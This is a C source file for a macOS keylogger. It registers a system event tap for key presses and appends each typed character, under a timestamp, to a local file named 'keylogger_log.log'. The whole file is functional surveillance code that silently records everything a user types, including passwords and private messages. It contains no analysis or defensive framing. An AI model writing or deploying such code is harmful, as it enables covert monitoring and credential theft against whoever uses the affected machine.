// HEADERS
#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <Carbon/Carbon.h>

FILE *log_file;

// FUNCTIONS
void config();
void startListen();
CGEventRef callback(CGEventTapProxy proxy, CGEventType type, CGEventRef event, void *userinfo);

int main(int argc, char *argv[]) {
	config();
	startListen();
	return 0;
}

void config() {
	time_t result = time(NULL);
	log_file = fopen("keylogger_log.log", "a");
	fprintf(log_file, "\n\n%s\n", asctime(localtime(&result)));

	if(log_file == NULL) {
		perror("Error: Unable to create log file.\n");
		exit(1);
	}
}

void startListen() {
	CGEventMask mask = CGEventMaskBit(kCGEventKeyDown);
	CFMachPortRef event = CGEventTapCreate(
		kCGSessionEventTap, kCGHeadInsertEventTap, kCGEventTapOptionDefault, mask, callback, NULL
	);

	if(event == NULL) {
		perror("Error: Unable to create event tap.\n");
		exit(1);
	}

	CFRunLoopSourceRef loopRef = CFMachPortCreateRunLoopSource(NULL, event, 0);
	CFRunLoopAddSource(CFRunLoopGetCurrent(), loopRef, kCFRunLoopCommonModes);
	CGEventTapEnable(event, true);
	fflush(stdout);
	CFRunLoopRun();
}

CGEventRef callback(CGEventTapProxy proxy, CGEventType type, CGEventRef event, void *refcon) {
	if (type == kCGEventKeyDown) {
		UniChar content[10];
    	UniCharCount count;
    	CGEventKeyboardGetUnicodeString(event, 10, &count, content);
        
    	fprintf(log_file, "%c", content[0]);
    	fflush(log_file);
	}

    return event;
}